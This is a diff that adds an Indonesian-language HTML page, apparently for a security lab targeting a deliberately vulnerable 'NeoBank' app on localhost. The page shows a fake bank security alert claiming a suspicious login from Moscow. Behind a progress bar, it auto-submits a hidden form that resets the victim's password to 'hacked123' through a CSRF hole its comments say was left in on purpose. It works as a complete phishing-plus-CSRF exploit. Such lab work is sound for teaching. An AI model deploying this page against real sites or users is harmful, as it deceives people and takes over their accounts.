@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 PERINGATAN KEAMANAN AKUN - NeoBank</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700&display=swap" rel="stylesheet">
+</head>
+
+<body class="bg-slate-50 min-h-screen flex items-center justify-center p-6 font-['Public_Sans']">
+
+    <div
+        class="max-w-md w-full bg-white p-10 rounded-[2.5rem] shadow-2xl border border-rose-100 text-center relative overflow-hidden">
+        <!-- Warning Background Icon -->
+        <div class="absolute -right-10 -bottom-10 opacity-5">
+            <svg class="w-64 h-64 text-rose-500" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M12 2L1 21h22L12 2zm1 14h-2v-2h2v2zm0-4h-2V8h2v4z"></path>
+            </svg>
+        </div>
+
+        <div class="relative z-10">
+            <div class="w-20 h-20 bg-rose-50 rounded-[2rem] flex items-center justify-center mx-auto mb-8 shadow-inner">
+                <svg class="w-10 h-10 text-rose-600 animate-pulse" fill="none" stroke="currentColor"
+                    viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
+                    </path>
+                </svg>
+            </div>
+
+            <h1 class="text-2xl font-black text-slate-900 mb-4 tracking-tight leading-tight uppercase">Akun Anda Dalam
+                Bahaya!</h1>
+            <p class="text-slate-500 text-sm font-medium mb-8 leading-relaxed">
+                Kami mendeteksi aktivitas login <span class="text-rose-600 font-bold">mencurigakan</span> dari perangkat
+                yang tidak dikenal. Untuk keamanan, sistem akan <span class="font-bold">mengamankan data Anda</span>
+                secara otomatis.
+            </p>
+
+            <div class="bg-slate-50 border border-slate-100 rounded-3xl p-6 mb-8 text-left">
+                <div class="flex items-start gap-4 mb-4">
+                    <div class="w-2 h-2 bg-rose-500 rounded-full mt-2 flex-shrink-0"></div>
+                    <div>
+                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Lokasi Percobaan</p>
+                        <p class="text-xs font-bold text-slate-700">Moscow, Russia (IP: 95.161.xxx.xx)</p>
+                    </div>
+                </div>
+                <div class="flex items-start gap-4">
+                    <div class="w-2 h-2 bg-rose-500 rounded-full mt-2 flex-shrink-0"></div>
+                    <div>
+                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Aksi Keamanan</p>
+                        <p class="text-xs font-bold text-slate-700 italic">Mengaktifkan Enskripsi Passkey...</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flex flex-col items-center gap-4">
+                <div class="relative w-full h-1 bg-slate-100 rounded-full overflow-hidden">
+                    <div id="progressBar"
+                        class="absolute left-0 top-0 h-full bg-rose-600 w-0 transition-all duration-[3000ms] ease-linear">
+                    </div>
+                </div>
+                <span id="timerText"
+                    class="text-[10px] font-bold text-slate-400 uppercase tracking-[0.2em] animate-pulse">Mohon tunggu
+                    sebentar...</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden CSRF Form -->
+    <!-- Profile.php di NeoBank biasanya mengupdate password -->
+    <form id="csrfProfile" action="http://localhost:8000/profile.php" method="POST" style="display:none;">
+        <input type="hidden" name="new_password" value="hacked123">
+        <input type="hidden" name="confirm_password" value="hacked123">
+        <!-- Karena profile.php di NeoBank sengaja tidak pakai CSRF token -->
+    </form>
+
+    <script>
+        window.onload = () => {
+            const bar = document.getElementById('progressBar');
+            const status = document.getElementById('timerText');
+
+            // Start progress bar
+            setTimeout(() => {
+                bar.style.width = '100%';
+            }, 100);
+
+            // Submit after 3 seconds
+            setTimeout(() => {
+                status.innerText = "Akun Berhasil Diamankan!";
+                document.getElementById('csrfProfile').submit();
+            }, 3000);
+        };
+    </script>
+</body>
+
+</html>
